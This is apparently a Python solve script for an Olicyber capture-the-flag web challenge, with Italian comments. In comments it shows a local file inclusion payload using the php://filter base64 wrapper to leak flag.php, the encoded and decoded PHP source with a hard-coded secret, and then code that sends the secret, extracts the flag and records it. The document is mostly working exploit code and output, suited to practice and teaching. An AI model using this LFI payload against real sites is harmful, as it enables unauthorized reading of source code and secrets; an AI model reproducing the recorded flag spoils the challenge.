import requests
import base64
import re

site = "http://splashbox.challs.olicyber.it"
# obtain_source = requests.get(f"{site}/?page=php://filter/convert.base64-encode/resource=flag").text LFI, in questo modo riusciamo a vedere il testo di flag.php 
# data = "PD9waHAKICAgICRmbGFnID0gJF9FTlZbIkZMQUcyIl07CiAgICBpZiAoaXNzZXQoJF9HRVRbInNlY3JldCJdKSAmJiAkX0dFVFsic2VjcmV0Il0gPT09ICI2OWE2MDZkNmM1MDMyOTNiN2I3YzU5M2ZlMjY5NDIyNCIpewogICAgICAgIGVjaG8gIjxoMj4kZmxhZzxoMj4iOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8aDI+VU5BVVRIT1JJWkVEISEhITwvaDI+IjsKICAgIH0KPz4="
# decoded = base64.b64decode(data).decode()
# print(decoded) 
# SOURCE
# <?php
#     $flag = $_ENV["FLAG2"];
#     if (isset($_GET["secret"]) && $_GET["secret"] === "69a606d6c503293b7b7c593fe2694224"){
#         echo "<h2>$flag<h2>";
#     } else {
#         echo "<h2>UNAUTHORIZED!!!!</h2>";
#     }
# ?>
r = requests.get(f"{site}/?page=flag&secret=69a606d6c503293b7b7c593fe2694224").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{f1ltr0_1nst4gr4m_3_c1t4z10n3_d1_Bibb0wski}

